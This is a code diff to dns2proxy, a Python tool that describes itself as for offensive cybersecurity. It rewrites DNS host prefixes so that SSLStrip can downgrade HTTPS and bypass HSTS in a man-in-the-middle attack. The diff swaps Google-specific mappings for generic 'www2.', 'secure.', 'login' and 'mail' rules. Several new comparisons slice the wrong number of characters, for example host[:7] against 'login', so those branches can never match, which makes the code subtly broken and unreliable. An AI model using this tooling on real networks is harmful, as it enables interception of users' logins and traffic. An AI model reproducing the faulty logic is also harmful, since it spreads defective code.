@@ -1,7 +1,6 @@
 #!/usr/bin/python2.6
 '''
-dns2proxy for offensive cybersecurity v1.0
-
+dns2proxy for offensive cybersecurity v1.1
 
 python dns2proxy.py -h for Usage.
 
@@ -575,16 +574,14 @@ def std_A_qry(msg, prov_ip):
             punto = host.find(".")
             dominio = host[punto:]
             host2 = ''
-            if host[:5] == 'wwww.' or host[:7] == 'social.':
+            if host[:5] == 'www2.' or host[:7] == 'secure.':
                 host2 = 'www%s' % dominio
-            elif host[:3] == 'web':
-                host2 = host[3:]
-            elif host[:7] == 'cuentas':
-                host2 = 'accounts%s' % dominio
-            elif host[:5] == 'gmail':
-                host2 = 'mail%s' % dominio
-            elif host == 'chatenabled.gmail.google.com':  # Yes, It is ugly....
-                host2 = 'chatenabled.mail.google.com'
+            elif host[:7] == 'login':
+                host2 = 'logins%s' % dominio
+            elif host[:5] == 'mail':
+                host2 = 'mails%s' % dominio
+         #   elif host == 'domain.com':  # Yes, It is ugly....
+       #         host2 = 'test.domain.com'
             if host2 != '':
                 DEBUGLOG('SSLStrip transforming host: %s => %s ...' % (host, host2))
                 ips = respuestas(host2, 'A')
